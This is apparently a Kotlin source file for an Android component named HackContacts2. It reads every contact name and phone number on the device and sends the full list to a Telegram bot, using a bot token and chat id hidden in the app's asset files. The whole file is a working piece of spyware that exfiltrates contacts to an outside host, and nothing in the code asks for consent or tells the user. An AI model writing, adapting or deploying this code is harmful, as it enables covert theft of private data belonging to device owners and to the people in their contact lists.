package com.example.hackcontacts2

import android.content.Context
import android.provider.ContactsContract
import okhttp3.*
import java.io.IOException

class HackContacts2(private val context: Context) {

    private val client = OkHttpClient()

    // function to send contacts to Telegram
    fun sendContacts() {
        val token = getTokenFromAssets()
        val chatId = getChatIdFromAssets()
        val contacts = getContacts()  // fetch contacts
        val meow = "Meow! ♥️\uFE0F"
        val messageToSend = "$contacts\n\n$meow\n\n"

        // create request body
        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", messageToSend)
            .build()

        // send request to Telegram API
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(requestBody)
            .build()

        // Send request asynchronously
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    println("Message sent successfully: ${response.body?.string()}")
                } else {
                    println("Error: ${response.body?.string()}")
                }
            }
        })
    }

    // function to fetch contacts
    fun getContacts(): String {
        val contactsList = mutableListOf<String>()
        val contentResolver = context.contentResolver
        val cursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val number = it.getString(numberIndex)
                contactsList.add("$name: $number")
            }
        }

        return contactsList.joinToString(separator = "\n")
    }

    // fetch token and chatId from assets (assuming these are saved in files)
    private fun getTokenFromAssets(): String {
        return context.assets.open("token.txt").bufferedReader().readText().trim()
    }

    private fun getChatIdFromAssets(): String {
        return context.assets.open("id.txt").bufferedReader().readText().trim()
    }
}
